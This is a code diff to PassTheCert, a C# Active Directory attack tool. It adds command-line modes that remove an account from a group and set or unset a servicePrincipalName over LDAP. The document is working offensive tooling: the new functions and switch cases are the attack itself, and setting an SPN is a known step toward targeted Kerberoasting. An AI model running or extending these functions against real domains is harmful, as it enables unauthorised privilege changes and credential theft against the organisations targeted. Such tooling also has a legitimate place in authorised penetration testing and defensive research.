@@ -342,6 +342,21 @@ namespace PassTheCert
             ModifyAttribute(connection, target, "member", System.Text.Encoding.Unicode.GetBytes(account), true, DirectoryAttributeOperation.Add);
         }
 
+        static void RemoveAccountFromGroupAttack(LdapConnection connection, string target, string account)
+        {
+            ModifyAttribute(connection, target, "member", System.Text.Encoding.Unicode.GetBytes(account), true, DirectoryAttributeOperation.Delete);
+        }
+
+        static void SetSPN(LdapConnection connection, string spn, string account)
+        {
+            ModifyAttribute(connection, account, "servicePrincipalName", System.Text.Encoding.Unicode.GetBytes(spn), true, DirectoryAttributeOperation.Add);
+        }
+
+        static void UnsetSPN(LdapConnection connection, string spn, string account)
+        {
+            ModifyAttribute(connection, account, "servicePrincipalName", System.Text.Encoding.Unicode.GetBytes(spn), true, DirectoryAttributeOperation.Delete);
+        }
+
         static void ToggleAccountStatus(LdapConnection connection, string userDn)
         {
             {
@@ -534,6 +549,15 @@ namespace PassTheCert
                     case "--add-account-to-group":
                         attack_type = "add_account_to_group";
                         break;
+                    case "--remove-account-from-group":
+                        attack_type = "remove_account_from_group";
+                        break;
+                    case "--set-spn":
+                        attack_type = "set_spn";
+                        break;
+                    case "--unset-spn":
+                        attack_type = "unset_spn";
+                        break;
 
                     // Parameters for elevate, RBCD, reset password, and add account to group attacks
                     case "--target":
@@ -611,11 +635,20 @@ namespace PassTheCert
                 case "add_account_to_group":
                     AddAccountToGroupAttack(connection, target, account);
                     break;
+                case "remove_account_from_group":
+                    RemoveAccountFromGroupAttack(connection, target, account);
+                    break;
+                case "set_spn":
+                    SetSPN(connection, target, account);
+                    break;
+                case "unset_spn":
+                    UnsetSPN(connection, target, account);
+                    break;
                 case "toggle_enabled":
                     ToggleAccountStatus(connection, account);
                     break;
                 default:
-                    Console.WriteLine("Attack type not supported, choose one between --elevate, --rbcd, --add-computer, --reset-password, --toggle-enabled, and --add-account-to-group.\n");
+                    Console.WriteLine("Attack type not supported, choose one between --elevate, --rbcd, --add-computer, --reset-password, --toggle-enabled, --add-account-to-group, and --remove-account-from-group.\n");
                     PrintHelp(1);
                     break;
             }
